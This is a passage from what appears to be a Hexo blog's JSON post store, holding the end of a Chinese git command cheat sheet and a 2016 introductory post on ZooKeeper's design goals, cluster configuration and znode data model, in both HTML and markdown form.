class=\"built_in\">log</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x8BE5;&#x63D0;&#x4EA4; ID &#x7684;&#x5C11;&#x4E00;&#x4E9B;&#x7684;&#x524D;&#x51E0;&#x4F4D;&#xFF0C;&#x53EA;&#x8981;&#x5B83;&#x662F;&#x552F;&#x4E00;&#x7684;&#x3002;</p>\n<h3 id=\"&#x66FF;&#x6362;&#x672C;&#x5730;&#x6539;&#x52A8;\"><a href=\"#&#x66FF;&#x6362;&#x672C;&#x5730;&#x6539;&#x52A8;\" class=\"headerlink\" title=\"&#x66FF;&#x6362;&#x672C;&#x5730;&#x6539;&#x52A8;\"></a>&#x66FF;&#x6362;&#x672C;&#x5730;&#x6539;&#x52A8;</h3><p>&#x5047;&#x5982;&#x4F60;&#x505A;&#x9519;&#x4E8B;&#xFF08;&#x81EA;&#x7136;&#xFF0C;&#x8FD9;&#x662F;&#x4E0D;&#x53EF;&#x80FD;&#x7684;&#xFF09;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x66FF;&#x6362;&#x6389;&#x672C;&#x5730;&#x6539;&#x52A8;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout -- &lt;filename&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#x6B64;&#x547D;&#x4EE4;&#x4F1A;&#x4F7F;&#x7528; HEAD &#x4E2D;&#x7684;&#x6700;&#x65B0;&#x5185;&#x5BB9;&#x66FF;&#x6362;&#x6389;&#x4F60;&#x7684;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x5DF2;&#x6DFB;&#x52A0;&#x5230;&#x7F13;&#x5B58;&#x533A;&#x7684;&#x6539;&#x52A8;&#xFF0C;&#x4EE5;&#x53CA;&#x65B0;&#x6587;&#x4EF6;&#xFF0C;&#x90FD;&#x4E0D;&#x53D7;&#x5F71;&#x54CD;&#x3002;</p>\n<p>&#x5047;&#x5982;&#x4F60;&#x60F3;&#x8981;&#x4E22;&#x5F03;&#x4F60;&#x6240;&#x6709;&#x7684;&#x672C;&#x5730;&#x6539;&#x52A8;&#x4E0E;&#x63D0;&#x4EA4;&#xFF0C;&#x53EF;&#x4EE5;&#x5230;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x83B7;&#x53D6;&#x6700;&#x65B0;&#x7684;&#x7248;&#x672C;&#x5E76;&#x5C06;&#x4F60;&#x672C;&#x5730;&#x4E3B;&#x5206;&#x652F;&#x6307;&#x5411;&#x5230;&#x5B83;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git fetch origin</span><br><span class=\"line\">git reset --hard origin/master</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"&#x6709;&#x7528;&#x7684;&#x8D34;&#x58EB;\"><a href=\"#&#x6709;&#x7528;&#x7684;&#x8D34;&#x58EB;\" class=\"headerlink\" title=\"&#x6709;&#x7528;&#x7684;&#x8D34;&#x58EB;\"></a>&#x6709;&#x7528;&#x7684;&#x8D34;&#x58EB;</h3><p>&#x5185;&#x5EFA;&#x7684;&#x56FE;&#x5F62;&#x5316; git&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gitk</span><br></pre></td></tr></table></figure></p>\n<p>&#x5F69;&#x8272;&#x7684; git &#x8F93;&#x51FA;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config color.ui <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x663E;&#x793A;&#x5386;&#x53F2;&#x8BB0;&#x5F55;&#x65F6;&#xFF0C;&#x53EA;&#x663E;&#x793A;&#x4E00;&#x884C;&#x6CE8;&#x91CA;&#x4FE1;&#x606F;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config format.pretty oneline</span><br></pre></td></tr></table></figure></p>\n<p>&#x4EA4;&#x4E92;&#x5730;&#x6DFB;&#x52A0;&#x6587;&#x4EF6;&#x81F3;&#x7F13;&#x5B58;&#x533A;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add -i</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"&#x94FE;&#x63A5;&#x4E0E;&#x8D44;&#x6E90;\"><a href=\"#&#x94FE;&#x63A5;&#x4E0E;&#x8D44;&#x6E90;\" class=\"headerlink\" title=\"&#x94FE;&#x63A5;&#x4E0E;&#x8D44;&#x6E90;\"></a>&#x94FE;&#x63A5;&#x4E0E;&#x8D44;&#x6E90;</h3><p><strong>&#x56FE;&#x5F62;&#x5316;&#x754C;&#x9762;</strong><br><a href=\"http://gitx.laullon.com/\">GitX (L) (OSX, open source)</a><br><a href=\"http://www.git-tower.com/\">Tower (OSX)</a><br><a href=\"http://www.sourcetreeapp.com/\">Source Tree (OSX, free)</a><br><a href=\"http://mac.github.com/\">GitHub for Mac (OSX, free)</a><br><a href=\"https://itunes.apple.com/gb/app/gitbox/id403388357?mt=12\">GitBox (OSX)</a></p>\n<p><strong>&#x6307;&#x5357;&#x4E0E;&#x624B;&#x518C;</strong><br><a href=\"https://git-scm.com/book/en/v2\">Git &#x793E;&#x533A;&#x53C2;&#x8003;&#x4E66;</a><br><a href=\"http://progit.org/book/\">&#x4E13;&#x4E1A; Git</a><br><a href=\"http://think-like-a-git.net/\">&#x5982; git &#x601D;&#x8003;</a><br><a href=\"http://help.github.com/\">GitHub &#x5E2E;&#x52A9;</a><br><a href=\"http://marklodato.github.com/visual-git-guide/index-en.html\">&#x56FE;&#x5F62;&#x5316;&#x7684; Git &#x6307;&#x5357;&#x4E00;&#x5219;</a></p>"},{"title":"Zookeeper简介","date":"2016-05-19T13:18:00.000Z","toc":false,"_content":"\n### 什么是Zookeeper？\nZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，它包含一个简单的原语集，分布式应用程序可以基于它实现同步服务，配置维护和命名服务等。Zookeeper是hadoop的一个子项目，其发展历程无需赘述。在分布式应用中，由于工程师不能很好地使用锁机制，以及基于消息的协调机制不适合在某些应用中使用，因此需要有一种可靠的、可扩展的、分布式的、可配置的协调机制来统一系统的状态。Zookeeper的目的就在于此。本文简单分析zookeeper的工作原理，对于如何使用zookeeper不是本文讨论的重点。\n\n### Zookeeper角色\n![](http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E7%AE%80%E4%BB%8B/1.png)\n\n<!-- more -->\n\n系统模型如图所示：\n![](http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E7%AE%80%E4%BB%8B/2.png)\n\n### 设计目的\n- 最终一致性：client不论连接到哪个Server，展示给它都是同一个视图，这是zookeeper最重要的性能。\n- 可靠性：具有简单、健壮、良好的性能，如果消息m被到一台服务器接受，那么它将被所有的服务器接受。\n- 实时性：Zookeeper保证客户端将在一个时间间隔范围内获得服务器的更新信息，或者服务器失效的信息。但由于网络延时等原因，Zookeeper不能保证两个客户端能同时得到刚更新的数据，如果需要最新数据，应该在读数据之前调用sync()接口。\n- 等待无关（wait-free）：慢的或者失效的client不得干预快速的client的请求，使得每个client都能有效的等待。\n- 原子性：更新只能成功或者失败，没有中间状态。\n- 顺序性：包括全局有序和偏序两种：全局有序是指如果在一台服务器上消息a在消息b前发布，则在所有Server上消息a都将在消息b前被发布；偏序是指如果一个消息b在消息a后被同一个发送者发布，a必将排在b前面。\n\n### 单机安装和配置\n1、解压：tar xzf zookeeper-3.4.5.tar.gz\n2、在conf目录下创建一个配置文件zoo.cfg，dataDir=/usr/local/zk/data\n3、启动ZooKeeper的Server：sh bin/zkServer.sh start, 如果想要关闭，输入：zkServer.sh stop\n\n### 集群安装和配置\n1、创建myid文件，server1机器的内容为：1，server2机器的内容为：2，server3机器的内容为：3\n2、在conf目录下创建一个配置文件zoo.cfg，\ndataDir=/usr/local/zk/data\nserver.1=server1:2888:3888\nserver.2=server2:2888:3888\nserver.3=server3:2888:3888\n\n### Zookeeper的数据模型\n- 层次化的目录结构，命名符合常规文件系统规范\n- 每个节点在zookeeper中叫做znode,并且其有一个唯一的路径标识\n- 节点Znode可以包含数据和子节点，但是EPHEMERAL类型的节点不能有子节点\n- Znode中的数据可以有多个版本，比如某一个路径下存有多个数据版本，那么查询这个路径下的数据就需要带上版本\n- 客户端应用可以在节点上设置监视器\n- 节点不支持部分读写，而是一次性完整读写\n\n","source":"_posts/Zookeeper简介.md","raw":"---\ntitle: Zookeeper简介\ncategories:\n  - 其他技术\ntags:\n  - 大数据\ndate: 2016-5-19 21:18:00\ntoc: false\n---\n\n### 什么是Zookeeper？\nZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，它包含一个简单的原语集，分布式应用程序可以基于它实现同步服务，配置维护和命名服务等。Zookeeper是hadoop的一个子项目，其发展历程无需赘述。在分布式应用中，由于工程师不能很好地使用锁机制，以及基于消息的协调机制不适合在某些应用中使用，因此需要有一种可靠的、可扩展的、分布式的、可配置的协调机制来统一系统的状态。Zookeeper的目的就在于此。本文简单分析zookeeper的工作原理，对于如何使用zookeeper不是本文讨论的重点。\n\n### Zookeeper角色\n![](http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E7%AE%80%E4%BB%8B/1.png)\n\n<!-- more -->\n\n系统模型如图所示：\n![](http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E7%AE%80%E4%BB%8B/2.png)\n\n### 设计目的\n- 最终一致性：client不论连接到哪个Server，展示给它都是同一个视图，这是zookeeper最重要的性能。\n- 可靠性：具有简单、健壮、良好的性能，如果消息m被到一台服务器接受，那么它将被所有的服务器接受。\n- 实时性：Zookeeper保证客户端将在一个时间间隔范围内获得服务器的更新信息，或者服务器失效的信息。但由于网络延时等原因，Zookeeper不能保证两个客户端能同时得到刚更新的数据，如果需要最新数据，应该在读数据之前调用sync()接口。\n- 等待无关（wait-free）：慢的或者失效的client不得干预快速的client的请求，使得每个client都能有效的等待。\n- 原子性：更新只能成功或者失败，没有中间状态。\n- 顺序性：包括全局有序和偏序两种：全局有序是指如果在一台服务器上消息a在消息b前发布，则在所有Server上消息a都将在消息b前被发布；偏序是指如果一个消息b在消息a后被同一个发送者发布，a必将排在b前面。\n\n### 单机安装和配置\n1、解压：tar xzf zookeeper-3.4.5.tar.gz\n2、在conf目录下创建一个配置文件zoo.cfg，dataDir=/usr/local/zk/data\n3、启动ZooKeeper的Server：sh bin/zkServer.sh start, 如果想要关闭，输入：zkServer.sh stop\n\n### 集群安装和配置\n1、创建myid文件，server1机器的内容为：1，server2机器的内容为：2，server3机器的内容为：3\n2、在conf目录下创建一个配置文件zoo.cfg，\ndataDir=/usr/local/zk/data\nserver.1=server1:2888:3888\nserver.2=server2:2888:3888\nserver.3=server3:2888:3888\n\n### Zookeeper的数据模型\n- 层次化的目录结构，命名符合常规文件系统规范\n- 每个节点在zookeeper中叫做znode,并且其有一个唯一的路径标识\n- 节点Znode可以包含数据和子节点，但是EPHEMERAL类型的节点不能有子节点\n- Znode中的数据可以有多个版本，比如某一个路径下存有多个数据版本，那么查询这个路径下的数据就需要带上版本\n- 客户端应用可以在节点上设置监视器\n- 节点不支持部分读写，而是一次性完整读写\n\n","slug":"Zookeeper简介","published":1,"updated":"2016-11-17T11:59:42.672Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulcs002zgwtmbirk74rw","content":"<h3 id=\"&#x4EC0;&#x4E48;&#x662F;Zookeeper&#xFF1F;\"><a href=\"#&#x4EC0;&#x4E48;&#x662F;Zookeeper&#xFF1F;\" class=\"headerlink\" title=\"&#x4EC0;&#x4E48;&#x662F;Zookeeper&#xFF1F;\"></a>&#x4EC0;&#x4E48;&#x662F;Zookeeper&#xFF1F;</h3><p>ZooKeeper&#x662F;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#xFF0C;&#x5F00;&#x653E;&#x6E90;&#x7801;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x534F;&#x8C03;&#x670D;&#x52A1;&#xFF0C;&#x5B83;&#x5305;&#x542B;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x539F;&#x8BED;&#x96C6;&#xFF0C;&#x5206;&#x5E03;&#x5F0F;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x53EF;&#x4EE5;&#x57FA;&#x4E8E;&#x5B83;&#x5B9E;&#x73B0;&#x540C;&#x6B65;&#x670D;&#x52A1;&#xFF0C;&#x914D;&#x7F6E;&#x7EF4;&#x62A4;&#x548C;&#x547D;&#x540D;&#x670D;&#x52A1;&#x7B49;&#x3002;Zookeeper&#x662F;hadoop&#x7684;&#x4E00;&#x4E2A;&#x5B50;&#x9879;&#x76EE;&#xFF0C;&#x5176;&#x53D1;&#x5C55;&#x5386;&#x7A0B;&#x65E0;&#x9700;&#x8D58;&#x8FF0;&#x3002;&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x5E94;&#x7528;&#x4E2D;&#xFF0C;&#x7531;&#x4E8E;&#x5DE5;&#x7A0B;&#x5E08;&#x4E0D;&#x80FD;&#x5F88;&#x597D;&#x5730;&#x4F7F;&#x7528;&#x9501;&#x673A;&#x5236;&#xFF0C;&#x4EE5;&#x53CA;&#x57FA;&#x4E8E;&#x6D88;&#x606F;&#x7684;&#x534F;&#x8C03;&#x673A;&#x5236;&#x4E0D;&#x9002;&#x5408;&#x5728;&#x67D0;&#x4E9B;&#x5E94;&#x7528;&#x4E2D;&#x4F7F;&#x7528;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x6709;&#x4E00;&#x79CD;&#x53EF;&#x9760;&#x7684;&#x3001;&#x53EF;&#x6269;&#x5C55;&#x7684;&#x3001;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#x3001;&#x53EF;&#x914D;&#x7F6E;&#x7684;&#x534F;&#x8C03;&#x673A;&#x5236;&#x6765;&#x7EDF;&#x4E00;&#x7CFB;&#x7EDF;&#x7684;&#x72B6;&#x6001;&#x3002;Zookeeper&#x7684;&#x76EE;&#x7684;&#x5C31;&#x5728;&#x4E8E;&#x6B64;&#x3002;&#x672C;&#x6587;&#x7B80;&#x5355;&#x5206;&#x6790;zookeeper&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#xFF0C;&#x5BF9;&#x4E8E;&#x5982;&#x4F55;&#x4F7F;&#x7528;zookeeper&#x4E0D;&#x662F;&#x672C;&#x6587;&#x8BA8;&#x8BBA;&#x7684;&#x91CD;&#x70B9;&#x3002;</p>\n<h3 id=\"Zookeeper&#x89D2;&#x8272;\"><a href=\"#Zookeeper&#x89D2;&#x8272;\" class=\"headerlink\" title=\"Zookeeper&#x89D2;&#x8272;\"></a>Zookeeper&#x89D2;&#x8272;</h3><p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E7%AE%80%E4%BB%8B/1.png\" alt=\"\"></p>\n<a id=\"more\"></a>\n<p>&#x7CFB;&#x7EDF;&#x6A21;&#x578B;&#x5982;&#x56FE;&#x6240;&#x793A;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E7%AE%80%E4%BB%8B/2.png\" alt=\"\"></p>\n<h3 id=\"&#x8BBE;&#x8BA1;&#x76EE;&#x7684;\"><a href=\"#&#x8BBE;&#x8BA1;&#x76EE;&#x7684;\" class=\"headerlink\" title=\"&#x8BBE;&#x8BA1;&#x76EE;&#x7684;\"></a>&#x8BBE;&#x8BA1;&#x76EE;&#x7684;</h3><ul>\n<li>&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#xFF1A;client&#x4E0D;&#x8BBA;&#x8FDE;&#x63A5;&#x5230;&#x54EA;&#x4E2A;Server&#xFF0C;&#x5C55;&#x793A;&#x7ED9;&#x5B83;&#x90FD;&#x662F;&#x540C;&#x4E00;&#x4E2A;&#x89C6;&#x56FE;&#xFF0C;&#x8FD9;&#x662F;zookeeper&#x6700;&#x91CD;&#x8981;&#x7684;&#x6027;&#x80FD;&#x3002;</li>\n<li>&#x53EF;&#x9760;&#x6027;&#xFF1A;&#x5177;&#x6709;&#x7B80;&#x5355;&#x3001;&#x5065;&#x58EE;&#x3001;&#x826F;&#x597D;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x5982;&#x679C;&#x6D88;&#x606F;m&#x88AB;&#x5230;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x63A5;&#x53D7;&#xFF0C;&#x90A3;&#x4E48;&#x5B83;&#x5C06;&#x88AB;&#x6240;&#x6709;&#x7684;&#x670D;&#x52A1;&#x5668;&#x63A5;&#x53D7;&#x3002;</li>\n<li>&#x5B9E;&#x65F6;&#x6027;&#xFF1A;Zookeeper&#x4FDD;&#x8BC1;&#x5BA2;&#x6237;&#x7AEF;&#x5C06;&#x5728;&#x4E00;&#x4E2A;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x8303;&#x56F4;&#x5185;&#x83B7;&#x5F97;&#x670D;&#x52A1;&#x5668;&#x7684;&#x66F4;&#x65B0;&#x4FE1;&#x606F;&#xFF0C;&#x6216;&#x8005;&#x670D;&#x52A1;&#x5668;&#x5931;&#x6548;&#x7684;&#x4FE1;&#x606F;&#x3002;&#x4F46;&#x7531;&#x4E8E;&#x7F51;&#x7EDC;&#x5EF6;&#x65F6;&#x7B49;&#x539F;&#x56E0;&#xFF0C;Zookeeper&#x4E0D;&#x80FD;&#x4FDD;&#x8BC1;&#x4E24;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x80FD;&#x540C;&#x65F6;&#x5F97;&#x5230;&#x521A;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x6700;&#x65B0;&#x6570;&#x636E;&#xFF0C;&#x5E94;&#x8BE5;&#x5728;&#x8BFB;&#x6570;&#x636E;&#x4E4B;&#x524D;&#x8C03;&#x7528;sync()&#x63A5;&#x53E3;&#x3002;</li>\n<li>&#x7B49;&#x5F85;&#x65E0;&#x5173;&#xFF08;wait-free&#xFF09;&#xFF1A;&#x6162;&#x7684;&#x6216;&#x8005;&#x5931;&#x6548;&#x7684;client&#x4E0D;&#x5F97;&#x5E72;&#x9884;&#x5FEB;&#x901F;&#x7684;client&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x4F7F;&#x5F97;&#x6BCF;&#x4E2A;client&#x90FD;&#x80FD;&#x6709;&#x6548;&#x7684;&#x7B49;&#x5F85;&#x3002;</li>\n<li>&#x539F;&#x5B50;&#x6027;&#xFF1A;&#x66F4;&#x65B0;&#x53EA;&#x80FD;&#x6210;&#x529F;&#x6216;&#x8005;&#x5931;&#x8D25;&#xFF0C;&#x6CA1;&#x6709;&#x4E2D;&#x95F4;&#x72B6;&#x6001;&#x3002;</li>\n<li>&#x987A;&#x5E8F;&#x6027;&#xFF1A;&#x5305;&#x62EC;&#x5168;&#x5C40;&#x6709;&#x5E8F;&#x548C;&#x504F;&#x5E8F;&#x4E24;&#x79CD;&#xFF1A;&#x5168;&#x5C40;&#x6709;&#x5E8F;&#x662F;&#x6307;&#x5982;&#x679C;&#x5728;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6D88;&#x606F;a&#x5728;&#x6D88;&#x606F;b&#x524D;&#x53D1;&#x5E03;&#xFF0C;&#x5219;&#x5728;&#x6240;&#x6709;Server&#x4E0A;&#x6D88;&#x606F;a&#x90FD;&#x5C06;&#x5728;&#x6D88;&#x606F;b&#x524D;&#x88AB;&#x53D1;&#x5E03;&#xFF1B;&#x504F;&#x5E8F;&#x662F;&#x6307;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x6D88;&#x606F;b&#x5728;&#x6D88;&#x606F;a&#x540E;&#x88AB;&#x540C;&#x4E00;&#x4E2A;&#x53D1;&#x9001;&#x8005;&#x53D1;&#x5E03;&#xFF0C;a&#x5FC5;&#x5C06;&#x6392;&#x5728;b&#x524D;&#x9762;&#x3002;</li>\n</ul>\n<h3 id=\"&#x5355;&#x673A;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;\"><a href=\"#&#x5355;&#x673A;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"&#x5355;&#x673A;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;\"></a>&#x5355;&#x673A;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;</h3><p>1&#x3001;&#x89E3;&#x538B;&#xFF1A;tar xzf zookeeper-3.4.5.tar.gz<br>2&#x3001;&#x5728;conf&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;zoo.cfg&#xFF0C;dataDir=/usr/local/zk/data<br>3&#x3001;&#x542F;&#x52A8;ZooKeeper&#x7684;Server&#xFF1A;sh bin/zkServer.sh start, &#x5982;&#x679C;&#x60F3;&#x8981;&#x5173;&#x95ED;&#xFF0C;&#x8F93;&#x5165;&#xFF1A;zkServer.sh stop</p>\n<h3 id=\"&#x96C6;&#x7FA4;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;\"><a href=\"#&#x96C6;&#x7FA4;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"&#x96C6;&#x7FA4;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;\"></a>&#x96C6;&#x7FA4;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;</h3><p>1&#x3001;&#x521B;&#x5EFA;myid&#x6587;&#x4EF6;&#xFF0C;server1&#x673A;&#x5668;&#x7684;&#x5185;&#x5BB9;&#x4E3A;&#xFF1A;1&#xFF0C;server2&#x673A;&#x5668;&#x7684;&#x5185;&#x5BB9;&#x4E3A;&#xFF1A;2&#xFF0C;server3&#x673A;&#x5668;&#x7684;&#x5185;&#x5BB9;&#x4E3A;&#xFF1A;3<br>2&#x3001;&#x5728;conf&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;zoo.cfg&#xFF0C;<br>dataDir=/usr/local/zk/data<br>server.1=server1:2888:3888<br>server.2=server2:2888:3888<br>server.3=server3:2888:3888</p>\n<h3 id=\"Zookeeper&#x7684;&#x6570;&#x636E;&#x6A21;&#x578B;\"><a href=\"#Zookeeper&#x7684;&#x6570;&#x636E;&#x6A21;&#x578B;\" class=\"headerlink\" title=\"Zookeeper&#x7684;&#x6570;&#x636E;&#x6A21;&#x578B;\"></a>Zookeeper&#x7684;&#x6570;&#x636E;&#x6A21;&#x578B;</h3><ul>\n<li>&#x5C42;&#x6B21;&#x5316;&#x7684;&#x76EE;&#x5F55;&#x7ED3;&#x6784;&#xFF0C;&#x547D;&#x540D;&#x7B26;&#x5408;&#x5E38;&#x89C4;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x89C4;&#x8303;</li>\n<li>&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x5728;zookeeper&#x4E2D;&#x53EB;&#x505A;znode,&#x5E76;&#x4E14;&#x5176;&#x6709;&#x4E00;&#x4E2A;&#x552F;&#x4E00;&#x7684;&#x8DEF;&#x5F84;&#x6807;&#x8BC6;</li>\n<li>&#x8282;&#x70B9;Znode&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x6570;&#x636E;&#x548C;&#x5B50;&#x8282;&#x70B9;&#xFF0C;&#x4F46;&#x662F;EPHEMERAL&#x7C7B;&#x578B;&#x7684;&#x8282;&#x70B9;&#x4E0D;&#x80FD;&#x6709;&#x5B50;&#x8282;&#x70B9;</li>\n<li>Znode&#x4E2D;&#x7684;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A;&#x7248;&#x672C;&#xFF0C;&#x6BD4;&#x5982;&#x67D0;&#x4E00;&#x4E2A;&#x8DEF;&#x5F84;&#x4E0B;&#x5B58;&#x6709;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x7248;&#x672C;&#xFF0C;&#x90A3;&#x4E48;&#x67E5;&#x8BE2;&#x8FD9;&#x4E2A;&#x8DEF;&#x5F84;&#x4E0B;&#x7684;&#x6570;&#x636E;&#x5C31;&#x9700;&#x8981;&#x5E26;&#x4E0A;&#x7248;&#x672C;</li>\n<li>&#x5BA2;&#x6237;&#x7AEF;&#x5E94;&#x7528;&#x53EF;&#x4EE5;&#x5728;&#x8282;&#x70B9;&#x4E0A;&#x8BBE;&#x7F6E;&#x76D1;&#x89C6;&#x5668;</li>\n<li>&#x8282;&#x70B9;&#x4E0D;&#x652F;&#x6301;&#x90E8;&#x5206;&#x8BFB;&#x5199;&#xFF0C;&#x800C;&#x662F;&#x4E00;&#x6B21;&#x6027;&#x5B8C;&#x6574;&#x8BFB;&#x5199;</li>\n</ul>\n","excerpt":"<h3 id=\"&#x4EC0;&#x4E48;&#x662F;Zookeeper&#xFF1F;\"><a href=\"#&#x4EC0;&#x4E48;&#x662F;Zookeeper&#xFF1F;\" class=\"headerlink\" title=\"&#x4EC0;&#x4E48;&#x662F;Zookeeper&#xFF1F;\"></a>&#x4EC0;&#x4E48;&#x662F;Zookeeper&#xFF1F;</h3><p>ZooKeeper&#x662F;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#xFF0C;&#x5F00;&#x653E;&#x6E90;&#x7801;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x534F;&#x8C03;&#x670D;&#x52A1;&#xFF0C;&#x5B83;&#x5305;&#x542B;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x539F;&#x8BED;&#x96C6;&#xFF0C;&#x5206;&#x5E03;&#x5F0F;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x53EF;&#x4EE5;&#x57FA;&#x4E8E;&#x5B83;&#x5B9E;&#x73B0;&#x540C;&#x6B65;&#x670D;&#x52A1;&#xFF0C;&#x914D;&#x7F6E;&#x7EF4;&#x62A4;&#x548C;&#x547D;&#x540D;&#x670D;&#x52A1;&#x7B49;&#x3002;Zookeeper&#x662F;hadoop&#x7684;&#x4E00;&#x4E2A;&#x5B50;&#x9879;&#x76EE;&#xFF0C;&#x5176;&#x53D1;&#x5C55;&#x5386;&#x7A0B;&#x65E0;&#x9700;&#x8D58;&#x8FF0;&#x3002;&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x5E94;&#x7528;&#x4E2D;&#xFF0C;&#x7531;&#x4E8E;&#x5DE5;&#x7A0B;&#x5E08;&#x4E0D;&#x80FD;&#x5F88;&#x597D;&#x5730;&#x4F7F;&#x7528;&#x9501;&#x673A;&#x5236;&#xFF0C;&#x4EE5;&#x53CA;&#x57FA;&#x4E8E;&#x6D88;&#x606F;&#x7684;&#x534F;&#x8C03;&#x673A;&#x5236;&#x4E0D;&#x9002;&#x5408;&#x5728;&#x67D0;&#x4E9B;&#x5E94;&#x7528;&#x4E2D;&#x4F7F;&#x7528;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x6709;&#x4E00;&#x79CD;&#x53EF;&#x9760;&#x7684;&#x3001;&#x53EF;&#x6269;&#x5C55;&#x7684;&#x3001;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#x3001;&#x53EF;&#x914D;&#x7F6E;&#x7684;&#x534F;&#x8C03;&#x673A;&#x5236;&#x6765;&#x7EDF;&#x4E00;&#x7CFB;&#x7EDF;&#x7684;&#x72B6;&#x6001;&#x3002;Zookeeper&#x7684;&#x76EE;&#x7684;&#x5C31;&#x5728;&#x4E8E;&#x6B64;&#x3002;&#x672C;&#x6587;&#x7B80;&#x5355;&#x5206;&#x6790;zookeeper&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#xFF0C;&#x5BF9;&#x4E8E;&#x5982;&#x4F55;&#x4F7F;&#x7528;zookeeper&#x4E0D;&#x662F;&#x672C;&#x6587;&#x8BA8;&#x8BBA;&#x7684;&#x91CD;&#x70B9;&#x3002;</p>\n<h3 id=\"Zookeeper&#x89D2;&#x8272;\"><a href=\"#Zookeeper&#x89D2;&#x8272;\" class=\"headerlink\" title=\"Zookeeper&#x89D2;&#x8272;\"></a>Zookeeper&#x89D2;&#x8272;</h3><p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E7%AE%80%E4%BB%8B/1.png\" alt=\"\"></p>","more":"<p>&#x7CFB;&#x7EDF;&#x6A21;&#x578B;&#x5982;&#x56FE;&#x6240;&#x793A;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E7%AE%80%E4%BB%8B/2.png\" alt=\"\"></p>\n<h3 id=\"&#x8BBE;&#x8BA1;&#x76EE;&#x7684;\"><a 